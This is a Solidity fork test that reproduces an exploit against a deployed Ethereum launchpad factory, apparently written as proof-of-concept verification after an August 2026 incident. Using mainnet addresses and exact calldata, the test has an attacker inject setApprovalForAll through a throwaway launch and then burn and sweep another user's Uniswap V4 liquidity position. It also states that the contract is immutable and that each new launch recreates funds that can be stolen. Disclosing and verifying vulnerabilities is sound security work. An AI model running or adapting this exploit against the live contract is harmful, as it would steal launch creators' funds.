// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Z3-H9 Unistreet LaunchpadFactoryAuto (Ethereum) — re-arm-per-launch verification.
//
// Bug: launch() is permissionless and forwards the caller's initCalldata/modifyCalldata VERBATIM
// into the Uniswap V4 PositionManager multicall AS THE FACTORY (msg.sender preserved). The factory
// is the ERC721 owner of every launch's LP position. So an attacker passes
// modifyCalldata = setApprovalForAll(attacker, true) inside their own throwaway launch, then calls
// POSM.modifyLiquidities(BURN_POSITION+TAKE_PAIR) on every factory-custodied position — including
// other users' launches — and takes the underlying assets.
//
// 2026-08 incident: 7 positions swept, ~$17.75k (USDC + WETH). Factory custody is 0 today, but the
// code path is immutable (not a proxy: EIP-1967 slots empty, full factory bytecode) and every new
// launch recreates the pot.
//
// This test replays, at the LATEST block, a fresh victim launch (Pigcon clone, 0.025 ETH seed,
// byte-exact calldata from the incident's own launch tx re-encoded for a fresh salt) and then has a
// FRESH attacker inject approval and sweep it. Read-only on mainnet: fork only.

import {ForkEnv} from "../src/ForkEnv.sol";

interface ILaunchpadFactoryAuto {
    struct Params {
        string name;
        string symbol;
        uint256 supply;
        address pairedStock;
        uint256 seedAmount;
        bytes32 salt;
        string description;
        string image;
        string website;
        string twitter;
        bool holdersShare;
    }
    struct SeedBuys {
        address payAsset;
        uint256 totalPayIn;
        bytes preCommands;
        bytes[] preInputs;
        uint128[] amounts;
        address[] recipients;
    }
    function launch(
        Params calldata p,
        bytes calldata initCalldata,
        bytes calldata modifyCalldata,
        SeedBuys calldata sb
    ) external payable returns (address token);
    function predict(bytes32 salt) external view returns (address);
    function positionIdOf(address token) external view returns (uint256);
}

interface IPositionManager {
    function balanceOf(address owner) external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
    function modifyLiquidities(bytes calldata unlockData, uint256 deadline) external payable;
    function isApprovedForAll(address owner, address operator) external view returns (bool);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract UnistreetRearmTest is ForkEnv {
    ILaunchpadFactoryAuto internal constant FACTORY = ILaunchpadFactoryAuto(0xFB60CD0B36aD4bD839b91767a6Ad9055AB6aD825);
    IPositionManager internal constant POSM = IPositionManager(0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e);
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    bytes32 internal constant VICTIM_SALT = 0x754c689e2ab73347fef62ef3f1a1d1726043a4048b42c250287518c9b6bfcac0;
    address internal constant VICTIM_TOKEN = 0xcEB58068e2673753290aC172150864ed80d244C2; // = FACTORY.predict(VICTIM_SALT)
    bytes32 internal constant EVIL_SALT = 0x150d61e877e5adb59198e9f4cd93e3c39bd43dc3263fc3bf8daf21b0f3af99e2;

    // Live operator approvals injected by the original incident (still true on mainnet today).
    address[4] internal KNOWN_OPERATORS = [
        0xc7d8c70f4349AcC55409800C8768e801b7556B77,
        0xEdA1f193e0c211b42ACAa9342Cb7150FA3fD205A,
        0x3c59433d780411923E808499c4fAD9b9809B5F51,
        0xDE2e60798068B95c7054642aBb428A1229a47A6C
    ];

    function setUp() public {
        vm.createSelectFork(_rpc("FORK_RPC_URL", _rpc("RPC_URL", "https://ethereum-rpc.publicnode.com")));
    }

    receive() external payable {}

    function test_Unistreet_fresh_launch_is_swept_by_fresh_attacker() public {
        uint256 forkBlock = block.number;
        emit log_named_uint("fork block", forkBlock);

        // --- live state: no custody today, but the incident's operator approvals are still active ---
        assertEq(POSM.balanceOf(address(FACTORY)), 0, "factory custodies 0 positions today");
        for (uint256 i; i < KNOWN_OPERATORS.length; i++) {
            assertTrue(
                POSM.isApprovedForAll(address(FACTORY), KNOWN_OPERATORS[i]),
                "incident operator approval still live on POSM"
            );
        }
        emit log("all 4 incident operator approvals still live on the PositionManager");

        // --- re-arm: a victim performs a fresh launch with a real 0.025 ETH seed buy ---
        address victim = makeAddr("victim");
        vm.deal(victim, 1 ether);
        assertEq(FACTORY.predict(VICTIM_SALT), VICTIM_TOKEN, "predicted token address matches");

        ILaunchpadFactoryAuto.Params memory p = ILaunchpadFactoryAuto.Params({
            name: "Pigcon",
            symbol: "PIGCON",
            supply: 1_000_000e18,
            pairedStock: USDC,
            seedAmount: 1_000_000e18,
            salt: VICTIM_SALT,
            description: "",
            image: "data:image/webp;base64,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",
            website: "https://github.com/Uniswap/unipig/blob/master/www/static/pigcon.png",
            twitter: "https://x.com/Uniswap/status/1181470959498227712",
            holdersShare: true
        });

        bytes memory initCalldata = hex"f7020405000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000ceb58068e2673753290ac172150864ed80d244c2000000000000000000000000000000000000000000000000000000000000271000000000000000000000000000000000000000000000000000000000000000c800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000d7cab79facd4e1d959e24c200349ab";
        bytes memory modifyCalldata = hex"dd46508f000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000f48657000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000002020d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000001a0000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000ceb58068e2673753290ac172150864ed80d244c2000000000000000000000000000000000000000000000000000000000000271000000000000000000000000000000000000000000000000000000000000000c800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000041ac80000000000000000000000000000000000000000000000000000000000050528000000000000000000000000000000000000000000000000010c81cbea99e8c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000d3c21bcecceda1000000000000000000000000000000fb60cd0b36ad4bd839b91767a6ad9055ab6ad825000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000ceb58068e2673753290ac172150864ed80d244c2";

        bytes[] memory preInputs = new bytes[](1);
        preInputs[0] = hex"00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000058d15e17628000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002bc02aaa39b223fe8d0a0e5c4f27ead9083c756cc20001f4a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000000000000000";
        uint128[] memory amounts = new uint128[](1);
        amounts[0] = 25e15;
        address[] memory recipients = new address[](1);
        recipients[0] = 0xC80D6DeaD5205fe62abB9009510D1bA13C3B194c;

        ILaunchpadFactoryAuto.SeedBuys memory sb = ILaunchpadFactoryAuto.SeedBuys({
            payAsset: WETH,
            totalPayIn: 25e15,
            preCommands: hex"00",
            preInputs: preInputs,
            amounts: amounts,
            recipients: recipients
        });

        vm.prank(victim);
        address launched = FACTORY.launch{value: 25e15}(p, initCalldata, modifyCalldata, sb);
        assertEq(launched, VICTIM_TOKEN, "victim launch creates the predicted token");

        uint256 positionId = FACTORY.positionIdOf(launched);
        emit log_named_uint("victim position tokenId", positionId);
        assertEq(POSM.ownerOf(positionId), address(FACTORY), "factory owns the new LP position");
        assertEq(POSM.balanceOf(address(FACTORY)), 1, "factory now custodies one position");

        // --- fresh attacker: throwaway launch whose modifyCalldata is setApprovalForAll(attacker) ---
        address attacker = address(this);
        bytes32 evilSalt = EVIL_SALT;
        address evilToken = FACTORY.predict(evilSalt);
        emit log_named_address("attacker throwaway token", evilToken);

        ILaunchpadFactoryAuto.Params memory ep = ILaunchpadFactoryAuto.Params({
            name: "Evil",
            symbol: "EVL",
            supply: 1_000_000e18,
            pairedStock: WETH,
            seedAmount: 1_000_000e18,
            salt: evilSalt,
            description: "",
            image: "",
            website: "",
            twitter: "",
            holdersShare: false
        });
        (address c0, address c1) = WETH < evilToken ? (WETH, evilToken) : (evilToken, WETH);
        bytes memory evilInit = abi.encodeWithSelector(
            0xf7020405, // initializePool((address,address,uint24,int24,address),uint160)
            c0, c1, uint24(10000), int24(200), address(0),
            uint160(79_228_162_514_264_337_593_543_950_336)
        );
        bytes memory evilModify = abi.encodeWithSelector(0xa22cb465, attacker, true); // setApprovalForAll
        ILaunchpadFactoryAuto.SeedBuys memory emptySb;
        FACTORY.launch(ep, evilInit, evilModify, emptySb);

        assertTrue(POSM.isApprovedForAll(address(FACTORY), attacker), "factory approved attacker on POSM");

        // --- sweep: burn the victim position and take both currencies ---
        uint256 usdcBefore = IERC20(USDC).balanceOf(attacker);
        uint256 tokBefore = IERC20(VICTIM_TOKEN).balanceOf(attacker);

        bytes memory actions = hex"0311"; // BURN_POSITION + TAKE_PAIR
        bytes[] memory params = new bytes[](2);
        params[0] = abi.encode(positionId, uint128(0), uint128(0), bytes(""));
        params[1] = abi.encode(USDC, VICTIM_TOKEN, attacker);
        POSM.modifyLiquidities(abi.encode(actions, params), block.timestamp + 300);

        uint256 usdcGain = IERC20(USDC).balanceOf(attacker) - usdcBefore;
        uint256 tokGain = IERC20(VICTIM_TOKEN).balanceOf(attacker) - tokBefore;

        emit log_named_decimal_uint("attacker USDC captured", usdcGain, 6);
        emit log_named_decimal_uint("attacker PIGCON captured", tokGain, 18);
        emit log_named_uint("factory POSM balance after sweep", POSM.balanceOf(address(FACTORY)));

        assertGt(usdcGain, 50e6, "attacker captured the launch's USDC side");
        assertGt(tokGain, 900_000e18, "attacker captured the launch's token side");
        assertEq(POSM.balanceOf(address(FACTORY)), 0, "custody swept back to zero");
    }
}
